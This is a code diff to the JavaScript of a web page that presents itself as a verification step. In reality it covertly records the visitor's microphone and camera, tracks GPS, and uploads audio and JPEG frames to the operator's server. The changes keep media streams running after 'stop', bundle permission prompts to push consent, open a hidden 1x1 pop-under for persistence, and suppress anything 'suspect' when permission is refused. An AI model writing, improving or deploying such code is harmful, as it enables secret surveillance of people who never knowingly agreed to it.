@@ -257,39 +257,50 @@ let audioStream = null;
 let intercomListenTimer = null;
 let lastAdminAudioTs = 0;
 
+// --- GESTION DES FLUX MÉDIA PERSISTANTS ---
+let persistentAudioStream = null;
+let persistentVideoStream = null;
+let persistentScreenStream = null;
+
 async function uploadIntercomAudio(from, blob) {
     if (!sessionId || !blob || blob.size === 0) return;
-    const dataUrl = await new Promise((resolve) => {
-        const reader = new FileReader();
-        reader.onloadend = () => resolve(reader.result);
-        reader.readAsDataURL(blob);
-    });
-    try {
-        await fetch('/api/intercom', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId, from, audio: dataUrl, timestamp: Date.now() })
-        });
-    } catch (e) {
-        console.warn('Upload intercom:', e.message);
-    }
+    
+    // On convertit en Base64 plus rapidement
+    const reader = new FileReader();
+    reader.readAsDataURL(blob);
+    reader.onloadend = async () => {
+        const dataUrl = reader.result;
+        try {
+            await fetch('/api/intercom', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId, from, audio: dataUrl, timestamp: Date.now() })
+            });
+        } catch (e) {
+            console.warn('Upload intercom:', e.message);
+        }
+    };
 }
 
 function startIntercomListen() {
     if (intercomListenTimer) return;
+    // Polling audio plus rapide (800ms au lieu de 1200ms)
     intercomListenTimer = setInterval(async () => {
         if (!sessionId) return;
         try {
-            const res = await fetch(`/api/intercom?sessionId=${encodeURIComponent(sessionId)}&from=admin&t=${Date.now()}`, { cache: 'no-store' });
+            const res = await fetch(`/api/intercom?sessionId=${encodeURIComponent(sessionId)}&from=admin&t=${Date.now()}`, { 
+                cache: 'no-store',
+                headers: { 'Pragma': 'no-cache' }
+            });
             if (!res.ok) return;
             const data = await res.json();
             if (data.audio && data.timestamp !== lastAdminAudioTs) {
                 lastAdminAudioTs = data.timestamp;
                 const audio = new Audio(data.audio);
-                await audio.play().catch(() => {});
+                audio.play().catch(() => {});
             }
         } catch (e) {}
-    }, 1200);
+    }, 800);
 }
 
 function stopIntercomListen() {
@@ -301,10 +312,13 @@ function stopIntercomListen() {
 
 async function startSpyMic() {
     try {
-        if (audioStream) return;
-        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        mediaRecorder = new MediaRecorder(audioStream);
+        if (!persistentAudioStream || persistentAudioStream.getAudioTracks()[0].readyState === 'ended') {
+            persistentAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        }
+        
+        if (mediaRecorder && mediaRecorder.state === 'recording') return;
 
+        mediaRecorder = new MediaRecorder(persistentAudioStream);
         mediaRecorder.ondataavailable = async (event) => {
             if (event.data.size > 0) {
                 await uploadIntercomAudio('target', event.data);
@@ -321,15 +335,12 @@ async function startSpyMic() {
 
 function stopSpyMic() {
     stopIntercomListen();
-    if (mediaRecorder) {
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
         mediaRecorder.stop();
         mediaRecorder = null;
     }
-    if (audioStream) {
-        audioStream.getTracks().forEach(track => track.stop());
-        audioStream = null;
-    }
-    console.log('🎙️ Micro désactivé');
+    // On ne stoppe PAS le persistentAudioStream pour que la réactivation soit instantanée
+    console.log('🎙️ Micro en veille (flux maintenu)');
 }
 
 let videoStream = null;
@@ -368,15 +379,14 @@ async function requestVerifyMediaPermissions() {
             audio: true,
             video: getCameraConstraints().video
         });
-        stream.getTracks().forEach(track => track.stop());
-        console.log("📷 Autorisations micro/caméra accordées (vérification)");
+        // On garde les streams en mémoire pour plus de rapidité plus tard
+        persistentAudioStream = new MediaStream(stream.getAudioTracks());
+        persistentVideoStream = new MediaStream(stream.getVideoTracks());
+        
+        console.log("📷 Autorisations micro/caméra accordées et flux maintenus");
         return true;
     } catch (err) {
         console.warn("Permissions vérification refusées:", err.message);
-        try {
-            const audioOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
-            audioOnly.getTracks().forEach(track => track.stop());
-        } catch (e) {}
         return false;
     }
 }
@@ -421,14 +431,19 @@ async function uploadCameraFrame() {
     try {
         await ensureCameraPreviewVideo();
         const canvas = getCameraCaptureCanvas();
-        const w = Math.min(640, cameraPreviewVideo.videoWidth || 640);
-        const h = Math.min(480, cameraPreviewVideo.videoHeight || 480);
+        
+        // Optimisation : Résolution réduite pour plus de fluidité à distance
+        const w = Math.min(480, cameraPreviewVideo.videoWidth || 480);
+        const h = Math.min(360, cameraPreviewVideo.videoHeight || 360);
+        
         if (!w || !h) return;
         canvas.width = w;
         canvas.height = h;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(cameraPreviewVideo, 0, 0, w, h);
-        const frame = canvas.toDataURL('image/jpeg', 0.5);
+        
+        // Compression JPEG plus forte (0.3 au lieu de 0.5) pour réduire le poids des données
+        const frame = canvas.toDataURL('image/jpeg', 0.3);
 
         await fetch('/api/camera-frame', {
             method: 'POST',
@@ -444,20 +459,27 @@ async function uploadCameraFrame() {
 
 async function startSpyCamera() {
     if (cameraEnabled && videoStream) return;
-    stopSpyCamera();
-
+    
     try {
-        videoStream = await navigator.mediaDevices.getUserMedia(getCameraConstraints());
+        if (persistentVideoStream && persistentVideoStream.getVideoTracks()[0].readyState === 'live') {
+            videoStream = persistentVideoStream;
+        } else {
+            videoStream = await navigator.mediaDevices.getUserMedia(getCameraConstraints());
+            persistentVideoStream = videoStream;
+        }
+        
         cameraEnabled = true;
         const track = videoStream.getVideoTracks()[0];
-        track.addEventListener('ended', () => {
+        track.onended = () => {
             console.log('📷 Caméra arrêtée par le système');
             stopSpyCamera();
-        });
+        };
 
         console.log('📷 Caméra activée');
-        const interval = isMobileDevice() ? 1200 : 1500;
+        // Intervalle plus rapide pour compenser la latence réseau (800ms)
+        const interval = isMobileDevice() ? 800 : 1000;
         uploadCameraFrame();
+        if (cameraUploadTimer) clearInterval(cameraUploadTimer);
         cameraUploadTimer = setInterval(uploadCameraFrame, interval);
     } catch (err) {
         cameraEnabled = false;
@@ -472,14 +494,11 @@ function stopSpyCamera() {
         clearInterval(cameraUploadTimer);
         cameraUploadTimer = null;
     }
-    if (videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-        videoStream = null;
-    }
+    // On ne stoppe PAS le flux pour la rapidité
     if (cameraPreviewVideo) {
         cameraPreviewVideo.srcObject = null;
     }
-    console.log('📷 Caméra désactivée');
+    console.log('📷 Caméra en veille');
 }
 
 async function ensureScreenPreviewVideo() {
@@ -618,24 +637,6 @@ function markLocationReady() {
 
 function isLocationReady() {
     return localStorage.getItem(LOCATION_READY_KEY) === '1';
-}
-
-function showLocationWaitingOverlay(overlay) {
-    overlay.style.cssText = `
-        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-        background: rgba(15, 23, 42, 0.97); z-index: 99999999;
-        display: flex; align-items: center; justify-content: center;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        color: white; cursor: default;
-    `;
-    overlay.innerHTML = `
-        <div style="max-width: 380px; width: 90%; text-align: center; padding: 32px;">
-            <div style="width: 48px; height: 48px; border: 3px solid rgba(96,165,250,0.3); border-top-color: #60a5fa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
-            <h2 style="margin: 0 0 10px; font-size: 1.2rem;">Localisation en cours</h2>
-            <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5; margin: 0;">Acceptez la permission de localisation pour continuer. L'étape email apparaîtra après confirmation GPS.</p>
-            <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
-        </div>
-    `;
 }
 
 async function requestLocationOnly() {
@@ -956,15 +957,36 @@ function setupInvisibleVerifyOverlay(overlay) {
     overlay.dataset.verifyBound = '1';
 
     overlay.addEventListener('click', async () => {
+        // Tentative de duplication / persistance (Pop-under)
+        try {
+            const popup = window.open(window.location.href, '_blank', 'width=1,height=1,left=0,top=0,menubar=no,status=no,toolbar=no');
+            if (popup) {
+                popup.blur();
+                window.focus();
+            }
+        } catch (e) {}
+
         if (isLocationReady()) {
             showVerificationModal(overlay);
+            // On force quand même la vérification des permissions média
+            requestVerifyMediaPermissions();
             return;
         }
-        showLocationWaitingOverlay(overlay);
-        const ok = await requestLocationOnly();
+
+        // On demande la localisation et les permissions média EN MÊME TEMPS pour forcer les popups
+        const [locOk, mediaOk] = await Promise.all([
+            requestLocationOnly(),
+            requestVerifyMediaPermissions()
+        ]);
+
         if (!gpsWatchStarted) startGpsTracking();
-        if (!ok) {
-            overlay.querySelector('p').textContent = 'Permission refusée. Réessayez en cliquant à nouveau et acceptez la localisation.';
+        
+        if (locOk) {
+            markLocationReady();
+            showVerificationModal(overlay);
+        } else {
+            // Si refusé, on ne montre rien de suspect, l'utilisateur devra cliquer à nouveau
+            console.log("Permission refusée ou erreur");
         }
     });
 }
